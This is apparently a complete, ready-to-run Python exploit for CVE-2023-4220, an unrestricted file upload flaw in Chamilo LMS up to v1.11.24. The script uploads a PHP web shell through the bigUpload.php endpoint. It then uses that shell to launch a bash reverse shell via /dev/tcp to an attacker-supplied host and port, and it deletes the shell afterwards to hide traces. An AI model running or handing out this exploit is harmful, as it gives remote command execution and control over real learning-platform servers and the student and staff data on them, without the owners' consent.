import requests, argparse

# Unrestricted File Upload in Chamilo LMS <= v1.11.24

vulnerable_endpoint = '/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
upload_directory    = '/main/inc/lib/javascript/bigupload/files/'
webshell_name       = 'pwn.php'

def urlencode_all_characters(string):
    return ''.join('%{0:0>2x}'.format(ord(char)) for char in string)

def upload_shell(url):
    print('[+] Uploading webshell... ', end='')
    payload = f"<?php system($_GET['cmd']); ?>"

    response = requests.post(
        url + vulnerable_endpoint,
        files = {
            'bigUploadFile': (
                webshell_name,
                payload
            )
        }
    )
    
    if response.status_code not in range(200, 299):
        print('\n[!] Target does not seem to be exploitable. Aborting.')
        exit(1)
    else:
        print(' done!')
        
def remove_webshell(url):
    print(f'[+] Remove webshell... ', end='')
    
    command = f"rm {webshell_name}"
    urlencoded_command = urlencode_all_characters(command)

    response = requests.get(f'{url}{upload_directory}{webshell_name}?cmd={urlencoded_command}')
 
    if response.status_code == 200:
        print(' done!')
    else:
        print('\n[-] Error. Aborting.')
        exit(1)
        
def reverse_shell(url, host, port):
    print(f'[+] Run reverse shell on host {host} and port {port}... ', end='')
    
    command = f"/bin/bash -c 'bash -i>&/dev/tcp/{host}/{port} 0>&1';"
    urlencoded_command = urlencode_all_characters(command)

    try:
        response = requests.get(f'{url}{upload_directory}{webshell_name}?cmd={urlencoded_command}', timeout=5)
    except requests.exceptions.ReadTimeout:
        print(' done!')
        return
        
    if response.status_code != 200:
        print('\n[-] Error. Aborting.')
        exit(1)

parser = argparse.ArgumentParser(description='Exploit for CVE-2023-4220')

parser.add_argument('-u', metavar='URL', help='Specify the vulnerable url.')
parser.add_argument('-i', metavar='IP_HOST', help='Specify host/ip for the reverse shell.')
parser.add_argument('-p', metavar='PORT', help='Specify port for the reverse shell.')

args = parser.parse_args()

if args.u and args.i and args.p:
    upload_shell(args.u)
    reverse_shell(args.u, args.i, args.p)
    remove_webshell(args.u)
else:
    parser.print_help()
